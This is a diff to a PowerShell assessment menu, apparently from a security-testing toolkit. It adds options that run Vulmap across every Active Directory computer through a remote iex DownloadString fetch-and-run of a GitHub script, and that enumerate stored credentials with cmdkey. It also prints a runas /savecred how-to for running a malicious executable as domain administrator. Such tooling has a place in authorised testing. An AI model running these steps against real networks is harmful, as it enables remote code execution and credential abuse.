@@ -33,6 +33,8 @@ Write-Host ""
 Write-Host "     Attacking Tools and Scripts:                                                      " -ForegroundColor White
 Write-Host ""
 Write-Host "     1. InfectionMonkey		| Breach and Attack Simulation tool                        " -ForegroundColor White
+Write-Host "     2. Vulmap(online)		| Find Windows/Linux installed software vulnerabilities    " -ForegroundColor White
+Write-Host "     3. cmdkey      		| Searching for usable domain admin stored credentials     " -ForegroundColor White
 Write-Host ""
 Write-Host "    99. Quit                                                                           " -ForegroundColor White
 Write-Host ""
@@ -102,6 +104,77 @@ switch ($input)
         Write-Host "Web interface: https://localhost:5000/" -ForegroundColor Yellow
         read-host “Press ENTER to continue”
       }
+
+    #Vulmap
+    2 {
+       $help = @"
+
+        Vulmap
+        ------
+        
+        Online local vulnerability scanner for installed software,
+        and then search for any existing exploites to the software in http://vulmon.com API.
+       
+        The script will run on all machines found in the Active Directory of the domain.
+              
+        All found exploits can be downloaded by Vulmap using this command:
+        Invoke-Vulmap -DownloadAllExploits
+
+"@
+        Write-Host $help
+        $ACQ = ACQ("Vulmap")
+        $ADcomputers = Get-ADComputer -Filter * | Select-Object name
+        foreach ($comp in $ADcomputers)
+        {
+            if (Test-Connection -ComputerName $comp.name -Count 1 -TimeToLive 20 -ErrorAction Continue)
+            {
+                $compname = $comp.name
+                success $compname
+                Invoke-command -COMPUTER $comp.Name -ScriptBlock {iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vulmon/Vulmap/master/Vulmap-Windows/vulmap-windows.ps1')} | out-string -Width 4096 > $ACQ\$compname.txt
+            }
+        }
+        read-host “Press ENTER to continue”
+        $null = start-Process -PassThru explorer $ACQ
+        }
+
+    #cmdkey
+    3 {
+       $help = @"
+
+        cmdkey
+        ------
+        
+        Cmdkey is a pre-installed Windows tool, It’s essentially a credential manager,
+        and these credentials are stored by default in:
+        C:\users\username\AppData\Roaming\Microsoft\Credentials\
+       
+       Cmdkey can store two types of password. The first is a generic password which can be used anywhere,
+       and the second a domain password which can be used to access a domain server.
+
+       Stored credentials can be leveraged to type the contents of files and run executables with the same 
+       privileges as the credentials stored.
+
+       The script will collect information from all machines found in the Active Directory of the domain.
+
+       Howto utilize the attack:
+       runas /savecred /user:Domain\Administrator "\\<Computer>\<share>\<evilApp.exe>
+
+"@
+        Write-Host $help
+        $ACQ = ACQ("cmdkey")
+        $ADcomputers = Get-ADComputer -Filter * | Select-Object name
+        foreach ($comp in $ADcomputers)
+        {
+            if (Test-Connection -ComputerName $comp.name -Count 1 -TimeToLive 20 -ErrorAction Continue)
+            {
+                $compname = $comp.name
+                success $compname
+                Invoke-command -COMPUTER $comp.Name -ScriptBlock {start cmdkey /list} 
+            }
+        }
+        read-host “Press ENTER to continue”
+        $null = start-Process -PassThru explorer $ACQ
+        }
 
     #Menu End
     }
